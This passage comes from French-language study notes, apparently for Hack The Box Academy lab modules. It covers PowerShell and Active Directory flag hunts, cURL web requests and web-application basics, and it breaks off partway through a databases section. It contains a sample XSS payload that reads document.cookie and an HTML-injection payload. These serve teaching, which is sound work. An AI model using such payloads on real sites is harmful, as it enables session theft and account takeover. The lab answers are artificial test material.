<h3>user7 → se connecter au <strong>DC</strong> et trouver un flag dans un <strong>module PowerShell</strong></h3>
<ol>
<li>Se connecter au DC :</li>
</ol>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>user7@10.129.204.9
<span class="c1"># Password: &lt;FLAG_user6&gt;</span>
ssh<span class="w"> </span>user7@172.16.5.155
<span class="c1"># Password: &lt;FLAG_user6&gt;</span>
</code></pre>
</div>
<ol>
<li>Sur le DC (PowerShell), chercher dans les modules :</li>
</ol>
<div class="codehilite">
<pre><span></span><code><span class="nv">$paths</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$env:PSModulePath</span> <span class="n">-split</span> <span class="s1">';'</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span> <span class="o">-and</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$_</span><span class="p">)</span> <span class="p">}</span>
<span class="nb">Select-String</span> <span class="n">-Path</span> <span class="p">(</span><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="nv">$paths</span> <span class="n">-Recurse</span> <span class="o">-File</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">ps1</span><span class="p">,*.</span><span class="n">psm1</span><span class="p">,*.</span><span class="n">psd1</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span><span class="p">).</span><span class="n">FullName</span> <span class="p">`</span>
  <span class="n">-Pattern</span> <span class="s1">'HTB\{[^}]+\}|flag\{[^}]+\}'</span> <span class="n">-AllMatches</span> <span class="o">-CaseSensitive</span><span class="p">:</span><span class="nv">$false</span> <span class="p">|</span>
  <span class="nb">Select-Object</span> <span class="n">-First</span> <span class="n">3</span> <span class="n">Path</span><span class="p">,</span><span class="n">LineNumber</span><span class="p">,</span><span class="n">Line</span>
</code></pre>
</div>
<p>Dans mon run, un module <strong>Flag-Finder</strong> existait sous <code>C:\Users\user7\Documents\WindowsPowerShell\Modules\...</code> et contenait une chaîne <code>{...}</code> → <strong>flag user7</strong> → mdp <strong>user8</strong>.</p>
<h3>user8 → GivenName d’un user AD dont <strong>Surname = "Flag"</strong></h3>
<p>Se connecter (workstation ou DC), puis <strong>PowerShell</strong> :</p>
<ul>
<li>Avec module AD dispo :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span>
<span class="nb">Get-ADUser</span> <span class="n">-LDAPFilter</span> <span class="s2">"(sn=Flag)"</span> <span class="n">-Properties</span> <span class="n">GivenName</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">GivenName</span>
</code></pre>
</div>
<ul>
<li>Sans module AD (fallback .NET) :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="nv">$root</span><span class="p">=</span><span class="no">[ADSI]</span><span class="s1">'LDAP://RootDSE'</span>
<span class="nv">$base</span><span class="p">=</span><span class="s2">"LDAP://</span><span class="p">$(</span><span class="nv">$root</span><span class="p">.</span><span class="n">defaultNamingContext</span><span class="p">)</span><span class="s2">"</span>
<span class="nv">$ds</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectorySearcher</span><span class="p">(</span><span class="no">[ADSI]</span><span class="nv">$base</span><span class="p">)</span>
<span class="nv">$ds</span><span class="p">.</span><span class="k">Filter</span><span class="p">=</span><span class="s1">'(sn=Flag)'</span><span class="p">;</span> <span class="nv">$ds</span><span class="p">.</span><span class="n">PageSize</span><span class="p">=</span><span class="n">1000</span>
<span class="nv">$ds</span><span class="p">.</span><span class="n">PropertiesToLoad</span><span class="p">.</span><span class="n">Clear</span><span class="p">();</span> <span class="nv">$ds</span><span class="p">.</span><span class="n">PropertiesToLoad</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s1">'givenName'</span><span class="p">)|</span><span class="nb">Out-Null</span>
<span class="p">(</span><span class="nv">$ds</span><span class="p">.</span><span class="n">FindAll</span><span class="p">()).</span><span class="n">Properties</span><span class="p">.</span><span class="n">givenname</span>
</code></pre>
</div>
<p>Résultat (prénom) = flag <strong>user8</strong> → mdp <strong>user9</strong>.</p>
<h3>user9 → <code>tasklist</code>, trier <strong>nom</strong> en ordre inverse, trouver celui qui commence par <code>vm</code></h3>
<ul>
<li>CMD :</li>
</ul>
<div class="codehilite">
<pre><span></span><code>tasklist<span class="w"> </span>/NH<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>/R<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span>/R<span class="w"> </span>/I<span class="w"> </span><span class="s2">"^vm"</span>
</code></pre>
</div>
<ul>
<li>PowerShell :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="n">tasklist</span> <span class="p">/</span><span class="n">fo</span> <span class="n">csv</span> <span class="p">|</span> <span class="nb">ConvertFrom-Csv</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="s1">'Image Name'</span> <span class="n">-Descending</span> <span class="p">|</span>
  <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="s1">'Image Name'</span> <span class="o">-match</span> <span class="s1">'^vm'</span> <span class="p">}</span> <span class="p">|</span>
  <span class="nb">Select-Object</span> <span class="n">-First</span> <span class="n">1</span> <span class="n">-ExpandProperty</span> <span class="s1">'Image Name'</span>
</code></pre>
</div>
<p>Nom d’image (ex. <code>vmms.exe</code>) = flag <strong>user9</strong> → mdp <strong>user10</strong>.</p>
<h3>user10 → sur le <strong>DC</strong>, identifier le compte le plus touché par <strong>Event ID 4625</strong> (bruteforce)</h3>
<p>Se connecter au DC (<code>ssh user10@172.16.5.155</code>, mdp = flag user9), <strong>PowerShell</strong> :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span><span class="n">LogName</span><span class="p">=</span><span class="s1">'Security'</span><span class="p">;</span> <span class="n">Id</span><span class="p">=</span><span class="n">4625</span><span class="p">}</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="p">|</span>
  <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="nv">$x</span><span class="p">=</span><span class="no">[xml]</span><span class="nv">$_</span><span class="p">.</span><span class="n">ToXml</span><span class="p">();</span> <span class="p">(</span><span class="nv">$x</span><span class="p">.</span><span class="n">Event</span><span class="p">.</span><span class="n">EventData</span><span class="p">.</span><span class="n">Data</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-eq</span> <span class="s1">'TargetUserName'</span> <span class="p">}).</span><span class="s1">'#text'</span> <span class="p">}</span> <span class="p">|</span>
  <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span> <span class="o">-and</span> <span class="nv">$_</span> <span class="o">-ne</span> <span class="s1">'-'</span> <span class="p">}</span> <span class="p">|</span>
  <span class="nb">Group-Object</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">Count</span> <span class="n">-Descending</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-First</span> <span class="n">1</span> <span class="n">-ExpandProperty</span> <span class="n">Name</span>
</code></pre>
</div>
<p>La valeur renvoyée (nom du compte AD) = <strong>flag user10</strong> (réponse finale).</p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Web Requests</strong></summary><div class="indented"><p><figure class="image"><a href="../static/image/cjca/url_structure.png"><img alt="" src="../static/image/cjca/url_structure.png"/></a></figure></p>
<h3>Structure d’une URL</h3>
<p>Une URL est composée de plusieurs éléments :</p>
<div class="codehilite"><pre><code>http://admin:password@inlanefreight.com:80/dashboard.php?login=true#status

</code></pre></div>
<table class="simple-table">
<thead>
<tr>
<th>Composant</th>
<th>Exemple</th>
<th>Rôle</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Scheme</strong></td>
<td><code>http://</code></td>
<td>Protocole utilisé</td>
</tr>
<tr>
<td><strong>User Info</strong></td>
<td><code>admin:password@</code></td>
<td>Authentification basique (rare)</td>
</tr>
<tr>
<td><strong>Host</strong></td>
<td><code>inlanefreight.com</code></td>
<td>Domaine ou IP</td>
</tr>
<tr>
<td><strong>Port</strong></td>
<td><code>:80</code></td>
<td>Port utilisé</td>
</tr>
<tr>
<td><strong>Path</strong></td>
<td><code>/dashboard.php</code></td>
<td>Ressource demandée</td>
</tr>
<tr>
<td><strong>Query String</strong></td>
<td><code>?login=true</code></td>
<td>Paramètres GET</td>
</tr>
<tr>
<td><strong>Fragment</strong></td>
<td><code>#status</code></td>
<td>Section de page (client-side uniquement)</td>
</tr>
</tbody>
</table>
<p><figure class="image"><a href="../static/image/cjca/HTTPS_Flow.webp"><img alt="" src="../static/image/cjca/HTTPS_Flow.webp"/></a></figure></p>
<h3>Fonctionnement HTTP</h3>
<ol>
<li>Résolution DNS → obtention de l’IP</li>
<li>Envoi d’un <strong>GET /</strong> vers le port 80</li>
<li>Le serveur renvoie :
<ul>
<li>un <strong>code HTTP</strong></li>
<li>des <strong>headers</strong></li>
<li>éventuellement un <strong>corps HTML</strong></li>
</ul></li>
<li>Le navigateur interprète le contenu</li>
</ol>
<h3>cURL – premières commandes</h3>
<p>Afficher une page :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>inlanefreight.com
</code></pre>
</div>
<p>Télécharger un fichier :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-O<span class="w"> </span>http://site.com/file.txt
</code></pre>
</div>
<p>Silent mode :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>http://site.com
</code></pre>
</div>
<p>Voir toutes les options :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-h
</code></pre>
</div>
<p><figure class="image"><a href="../static/image/cjca/HTTPS_Flow.png"><img alt="" src="../static/image/cjca/HTTPS_Flow.png"/></a></figure></p>
<h1><strong>HTTPS</strong></h1>
<h3>Pourquoi HTTPS ?</h3>
<p>HTTP = clair → mots de passe lisibles.</p>
<p>HTTPS = chiffrement TLS → données illisibles.</p>
<h3>Certificat invalide → cURL refuse.</h3>
<p>Bypass :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-k<span class="w"> </span>https://site-avec-mauvais-certificat.com
</code></pre>
</div>
<h1><strong>HTTP Requests &amp; Responses</strong></h1>
<h3>Requête HTTP GET</h3>
<div class="codehilite"><pre><code>GET /users/login.html HTTP/1.1
Host: inlanefreight.com
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=xxx

</code></pre></div>
<h3>Réponse HTTP</h3>
<div class="codehilite"><pre><code>HTTP/1.1 200 OK
Server: Apache/2.4.41
Content-Type: text/html
...
&lt;HTML&gt;...&lt;/HTML&gt;

</code></pre></div>
<h3>Voir la requête + réponse avec cURL</h3>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>http://inlanefreight.com
</code></pre>
</div>
<h1><strong>HTTP Headers</strong></h1>
<h3>Catégories :</h3>
<ul>
<li><strong>General Headers</strong></li>
<li><strong>Entity Headers</strong></li>
<li><strong>Request Headers</strong></li>
<li><strong>Response Headers</strong></li>
<li><strong>Security Headers</strong></li>
</ul>
<p>Exemples importants :</p>
<table class="simple-table">
<thead>
<tr>
<th>Header</th>
<th>Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Host</code></td>
<td>Requis en HTTP/1.1</td>
</tr>
<tr>
<td><code>User-Agent</code></td>
<td>Identifie le client</td>
</tr>
<tr>
<td><code>Cookie</code></td>
<td>Sessions</td>
</tr>
<tr>
<td><code>Content-Type</code></td>
<td>Définit le type du body</td>
</tr>
<tr>
<td><code>Set-Cookie</code></td>
<td>Le serveur crée une session</td>
</tr>
<tr>
<td><code>Authorization</code></td>
<td>Bearer / Basic base64</td>
</tr>
</tbody>
</table>
<h3>Voir uniquement les headers :</h3>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-I<span class="w"> </span>http://site.com
</code></pre>
</div>
<p>Voir headers + body :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-i<span class="w"> </span>http://site.com
</code></pre>
</div>
<p>Changer son user-agent :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-A<span class="w"> </span><span class="s2">"Mozilla/5.0"</span><span class="w"> </span>site.com
</code></pre>
</div>
<h1><strong>HTTP Methods &amp; Status Codes</strong></h1>
<h3>Méthodes essentielles</h3>
<table class="simple-table">
<thead>
<tr>
<th>Méthode</th>
<th>Rôle</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>GET</strong></td>
<td>Récupérer une ressource</td>
</tr>
<tr>
<td><strong>POST</strong></td>
<td>Envoyer des données</td>
</tr>
<tr>
<td><strong>HEAD</strong></td>
<td>Same as GET, sans body</td>
</tr>
<tr>
<td><strong>PUT</strong></td>
<td>Modifier une ressource</td>
</tr>
<tr>
<td><strong>DELETE</strong></td>
<td>Supprimer une ressource</td>
</tr>
</tbody>
</table>
<h3>Codes HTTP</h3>
<table class="simple-table">
<thead>
<tr>
<th>Code</th>
<th>Signification</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>200 OK</strong></td>
<td>Succès</td>
</tr>
<tr>
<td><strong>302 Found</strong></td>
<td>Redirection</td>
</tr>
<tr>
<td><strong>400 Bad Request</strong></td>
<td>Mauvaise syntaxe</td>
</tr>
<tr>
<td><strong>403 Forbidden</strong></td>
<td>Accès refusé</td>
</tr>
<tr>
<td><strong>404 Not Found</strong></td>
<td>Ressource inexistante</td>
</tr>
<tr>
<td><strong>500 Internal Server Error</strong></td>
<td>Erreur serveur</td>
</tr>
</tbody>
</table>
<h1><strong>GET + HTTP Basic Auth</strong></h1>
<p><figure class="image"><a href="../static/image/cjca/raw_request.png"><img alt="" src="../static/image/cjca/raw_request.png"/></a></figure></p>
<p>Le serveur protège une page via <strong>Basic Auth</strong> :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-u<span class="w"> </span>admin:admin<span class="w"> </span>http://IP:PORT/
</code></pre>
</div>
<p>Equivalent :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>http://admin:admin@IP:PORT/
</code></pre>
</div>
<p>Voir ce qui se passe :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>http://admin:admin@IP:PORT/
</code></pre>
</div>
<p>On observe :</p>
<div class="codehilite"><pre><code>Authorization: Basic YWRtaW46YWRtaW4=

</code></pre></div>
<p>(base64 → admin:admin)</p>
<h1><strong>GET parameters – Search</strong></h1>
<p>Exemple :</p>
<div class="codehilite"><pre><code>/search.php?search=le

</code></pre></div>
<p>On peut reproduire :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span><span class="s2">"http://IP:PORT/search.php?search=le"</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">"Authorization: Basic YWRtaW46YWRtaW4="</span>
</code></pre>
</div>
<h1><strong>POST – Login Form + Cookies</strong></h1>
<p>Exemple login :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s2">"username=admin&amp;password=admin"</span><span class="w"> </span>http://IP:PORT/
</code></pre>
</div>
<p>Récupérer le cookie :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-i<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s2">"username=admin&amp;password=admin"</span><span class="w"> </span>http://IP:PORT/
</code></pre>
</div>
<p>On obtient :</p>
<div class="codehilite"><pre><code>Set-Cookie: PHPSESSID=xxxxx

</code></pre></div>
<p>Réutilisation :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-b<span class="w"> </span><span class="s2">"PHPSESSID=xxxxx"</span><span class="w"> </span>http://IP:PORT/
</code></pre>
</div>
<h1><strong>POST JSON Requests</strong></h1>
<p>Search avec JSON :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="s2">"http://IP:PORT/search.php"</span><span class="w"> </span><span class="se">\</span>
<span class="w">     </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="se">\</span>
<span class="w">     </span>-b<span class="w"> </span><span class="s2">"PHPSESSID=xxxx"</span><span class="w"> </span><span class="se">\</span>
<span class="w">     </span>-d<span class="w"> </span><span class="s1">'{"search":"london"}'</span>
</code></pre>
</div>
<h1><strong>CRUD API (Create, Read, Update, Delete)</strong></h1>
<h3>READ</h3>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>http://IP:PORT/api.php/city/london
</code></pre>
</div>
<p>Formatage JSON :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>http://IP:PORT/api.php/city/london<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
</code></pre>
</div>
<h3>CREATE (POST)</h3>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://IP:PORT/api.php/city/<span class="w"> </span><span class="se">\</span>
<span class="w">     </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="se">\</span>
<span class="w">     </span>-d<span class="w"> </span><span class="s1">'{"city_name":"HTB_City","country_name":"HTB"}'</span>
</code></pre>
</div>
<h3>UPDATE (PUT)</h3>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://IP:PORT/api.php/city/london<span class="w"> </span><span class="se">\</span>
<span class="w">     </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="se">\</span>
<span class="w">     </span>-d<span class="w"> </span><span class="s1">'{"city_name":"flag","country_name":"HTB"}'</span>
</code></pre>
</div>
<h3>DELETE</h3>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>DELETE<span class="w"> </span>http://IP:PORT/api.php/city/flag
</code></pre>
</div>
<h3>Obtenir le flag via CRUD</h3>
<p>Mettre à jour une ville → name="flag"</p>
<p>Supprimer n’importe quelle ville</p>
<p>Lire /city/flag</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>http://IP:PORT/api.php/city/flag
</code></pre>
</div>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Web Applications</strong></summary><div class="indented"><p></p>
<details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Risques &amp; enjeux de sécurité</strong></summary><div class="indented"><p>Les web apps exposent une <strong>surface d’attaque énorme</strong>, accessible mondialement.</p>
<p>Attaques courantes :</p>
<ul>
<li><strong>SQL Injection</strong> → extraction données / RCE DB</li>
<li><strong>File Upload non sécurisé</strong> → shell upload</li>
<li><strong>LFI/RFI</strong> → vol de code, RCE</li>
<li><strong>IDOR &amp; Broken Access Control</strong> → accès aux données d’autres utilisateurs</li>
<li><strong>Chaining</strong> : exploitation d'une faille pour en attaquer une autre (ex : récupérer des emails AD via SQLi → password spraying)</li>
</ul>
<p>Importance :</p>
<p>→ tester fréquemment</p>
<p>→ appliquer les bonnes pratiques de développement</p>
<p>→ suivre OWASP WSTG</p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Web Application Layout (infrastructure &amp; architecture)</strong></summary><div class="indented"><h3><strong>Modèles d’hébergement</strong></h3>
<p><strong>One Server</strong> : tout sur une machine (web + DB)</p>
<p>→ Simple mais <strong>dangereux</strong> : un hack = tout est compromis.</p>
<p><strong>Many Servers – One DB</strong></p>
<p>→ Plusieurs webservers, une base unique</p>
<p>→ Segmentation, meilleure résilience.</p>
<p><strong>Many Servers – Many DBs</strong></p>
<p>→ Chaque app = sa DB</p>
<p>→ Sécurité maximale + haute disponibilité.</p>
<p><strong>Microservices</strong></p>
<p>→ Petites briques indépendantes (login, search, paiement…)</p>
<p>→ Scalabilité, isolation, moindre impact en cas de faille.</p>
<p><strong>Serverless</strong> (AWS Lambda, Azure Functions…)</p>
<p>→ Pas de gestion de serveurs, architecture cloud-native.</p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Trois couches d’une Web App (3-tier architecture)</strong></summary><div class="indented"><ul>
<li><strong>Presentation Layer</strong> : HTML, CSS, JS</li>
<li><strong>Application Layer</strong> : logique métier, contrôles, API</li>
<li><strong>Data Layer</strong> : bases de données (SQL, NoSQL)</li>
</ul>
<p>Comprendre cette architecture permet d’anticiper :</p>
<p>→ où chercher les failles</p>
<p>→ comment pivoter d’un composant à un autre.</p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Front-end vs Back-end</strong></summary><div class="indented"><h3><strong>Front-end</strong></h3>
<p>Code exécuté dans le navigateur :</p>
<ul>
<li><strong>HTML</strong> → structure</li>
<li><strong>CSS</strong> → style</li>
<li><strong>JavaScript</strong> → logique côté client</li>
</ul>
<p>Peut contenir des failles <strong>exploitables côté client</strong> :</p>
<ul>
<li>Sensitive Data Exposure</li>
<li>HTML Injection</li>
<li>XSS</li>
<li>CSRF (si exploitable via XSS)</li>
</ul>
<h3><strong>Back-end</strong></h3>
<p>Code exécuté sur le serveur :</p>
<ul>
<li>OS (Linux/Windows)</li>
<li>Serveurs web (Apache, nginx, IIS)</li>
<li>Frameworks (Laravel, Django, Express, ASP.NET…)</li>
<li>Bases de données (MySQL, MSSQL, MongoDB…)</li>
</ul>
<p>Failles exploitées :</p>
<ul>
<li>SQLi</li>
<li>RCE via upload / inclusion</li>
<li>Logic flaws</li>
<li>Auth bypass</li>
<li>Broken access control</li>
</ul>
<p><figure class="image"><a href="../static/image/cjca/backend-server.jpg"><img alt="" src="../static/image/cjca/backend-server.jpg"/></a></figure></p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>HTML – notions essentielles</strong></summary><div class="indented"><p>HTML structure la page via des balises.</p>
<p>Balise d’image → <strong><code>&lt;img&gt;</code></strong></p>
<p>Concept important : <strong>URL Encoding</strong></p>
<p>→ les caractères spéciaux doivent être encodés en <code>%XX</code></p>
<p>Ex : <code>'</code> = <code>%27</code>, espace = <code>%20</code>.</p>
<p>Utile pour :</p>
<ul>
<li>bypass filtres</li>
<li>injections dans URL</li>
<li>exploitation XSS / HTML injection</li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>CSS – notions essentielles</strong></summary><div class="indented"><p>CSS permet de styliser des éléments :</p>
<div class="codehilite">
<pre><span></span><code><span class="nt">text-align</span><span class="o">:</span><span class="w"> </span><span class="nt">left</span><span class="o">;</span>
</code></pre>
</div>
<p>Frameworks populaires : Bootstrap, Bulma, Tailwind.</p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>JavaScript – notions essentielles</strong></summary><div class="indented"><p>JS rend une page dynamique :</p>
<ul>
<li>modification du DOM</li>
<li>appels API</li>
<li>formulaires interactifs</li>
<li>animations</li>
<li>vulnérabilités : <strong>DOM XSS</strong>, manipulations côté client</li>
</ul>
<p>Ex de modification DOM :</p>
<div class="codehilite">
<pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"button1"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Changed Text!"</span><span class="p">;</span>
</code></pre>
</div>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Sensitive Data Exposure</strong></summary><div class="indented"><p>Cas typiques :</p>
<ul>
<li>Identifiants laissés dans des commentaires HTML</li>
<li>JS contenant des informations internes</li>
<li>Répertoires cachés</li>
<li>API endpoints non documentés</li>
<li>Clés API exposées</li>
</ul>
<p>Ex trouvée dans la leçon :</p>
<div class="codehilite">
<pre><span></span><code><span class="cm">&lt;!-- TODO: remove test credentials test:test --&gt;</span>
</code></pre>
</div>
<p>→ password = <strong>test</strong></p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>HTML Injection</strong></summary><div class="indented"><p>Donnée utilisateur affichée <strong>sans filtrage</strong> → injection HTML :</p>
<p>Payload :</p>
<div class="codehilite">
<pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://www.hackthebox.com"</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre>
</div>
<p>Résultat affiché : <strong>Click Me</strong> (cliquable)</p>
<p>Permet :</p>
<p>✔ defacement</p>
<p>✔ phishing front-end</p>
<p>✔ précurseur pour XSS</p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>XSS (Cross-Site Scripting)</strong></summary><div class="indented"><p>Trois types :</p>
<ul>
<li><strong>Reflected</strong> : via paramètres GET</li>
<li><strong>Stored</strong> : stocké en DB, affiché à d'autres</li>
<li><strong>DOM-Based</strong> : exécuté dans le navigateur</li>
</ul>
<p>Ex payload utilisé :</p>
<div class="codehilite">
<pre><span></span><code>"&gt;<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">/</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(document.cookie)</span><span class="p">&gt;</span>
</code></pre>
</div>
<p>But : afficher le cookie de session.</p>
<p>→ permet vol de sessions et takeover de comptes.</p>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>CSRF (Cross-Site Request Forgery)</strong></summary><div class="indented"><p>Principe :</p>
<p>→ L’utilisateur est authentifié</p>
<p>→ L’attaquant force son navigateur à exécuter des actions à sa place</p>
<p>Ex : changement automatique du mot de passe via XSS + requête POST.</p>
<p>Protection :</p>
<ul>
<li>Tokens CSRF</li>
<li>SameSite cookies</li>
<li>Double Submit Cookies</li>
<li>Confirmation manuelle (password re-entry)</li>
</ul>
<h1><strong>Back-End Servers</strong></h1>
<p>Le <strong>serveur back-end</strong> est la machine (physique, VM ou cloud) qui exécute :</p>
<ul>
<li>le <strong>web server</strong> (Apache, Nginx, IIS)</li>
<li>la <strong>base de données</strong> (SQL ou NoSQL)</li>
<li>le <strong>framework</strong> (Laravel, Django, Express, Rails)</li>
<li>d’autres éléments (WAF, containers, hyperviseur)</li>
</ul>
<p>C’est la couche <strong>Data Access Layer</strong>.</p>
<h3>Stacks courants :</h3>
<table class="simple-table">
<thead>
<tr>
<th>Stack</th>
<th>OS</th>
<th>Serveur Web</th>
<th>DB</th>
<th>Langage</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>LAMP</strong></td>
<td>Linux</td>
<td>Apache</td>
<td>MySQL</td>
<td>PHP</td>
</tr>
<tr>
<td><strong>WAMP</strong></td>
<td>Windows</td>
<td>Apache</td>
<td>MySQL</td>
<td>PHP</td>
</tr>
<tr>
<td><strong>WINS</strong></td>
<td>Windows</td>
<td>IIS</td>
<td>SQL Server</td>
<td>.NET</td>
</tr>
<tr>
<td><strong>XAMPP</strong></td>
<td>Cross-platform</td>
<td>Apache</td>
<td>MySQL</td>
<td>PHP/Perl</td>
</tr>
</tbody>
</table>
<p>👉 <strong>WAMP = Windows</strong></p>
<h1><strong>Web Servers</strong></h1>
<p>Un <strong>web server</strong> traite les requêtes HTTP/HTTPS, renvoie des réponses et dirige l’exécution vers la bonne ressource (route, fichier, API…).</p>
<p>Ports principaux :</p>
<ul>
<li><strong>80</strong> (HTTP)</li>
<li><strong>443</strong> (HTTPS)</li>
</ul>
<h3>Codes HTTP importants :</h3>
<table class="simple-table">
<thead>
<tr>
<th>Code</th>
<th>Signification</th>
</tr>
</thead>
<tbody>
<tr>
<td>200</td>
<td>OK</td>
</tr>
<tr>
<td>301</td>
<td>Moved Permanently</td>
</tr>
<tr>
<td>302</td>
<td>Found</td>
</tr>
<tr>
<td>400</td>
<td>Bad Request</td>
</tr>
<tr>
<td>401</td>
<td>Unauthorized</td>
</tr>
<tr>
<td>403</td>
<td>Forbidden</td>
</tr>
<tr>
<td>404</td>
<td>Not Found</td>
</tr>
<tr>
<td>405</td>
<td>Method Not Allowed</td>
</tr>
<tr>
<td>500</td>
<td>Internal Server Error</td>
</tr>
</tbody>
</table>
<blockquote>
<p>Pour la question : HTTP 201 = Created</p>
</blockquote>
<h3>Principaux serveurs :</h3>
<h3><strong>1. Apache</strong></h3>
<ul>
<li>40% du web</li>
<li>Très modulable (mod_php, mod_security…)</li>
<li>Utilisé par : Apple, Adobe, Baidu…</li>
</ul>
<h3><strong>2. NGINX</strong></h3>
<ul>
<li>Architecture asynchrone → très performant</li>
<li>Serveur des sites à fort trafic (60% du top 100k)</li>
<li>Utilisé par : Google, Facebook, Netflix, Cisco, HTB…</li>
</ul>
<h3><strong>3. IIS</strong></h3>
<ul>
<li>Spécifique Windows Server</li>
<li>Très intégré à Active Directory (Windows Auth)</li>
<li>Utilisé par : Microsoft, O365, Skype, StackOverflow…</li>
</ul>
<p>Autres : Tomcat (Java), Node.js (JS backend)</p>
<h1><strong>Databases</strong></h1>
<p>Les web apps utilisent des bases pour stocker contenus, sessions, utilisateurs, configs…</p>
<p>Deux grandes familles :</p>
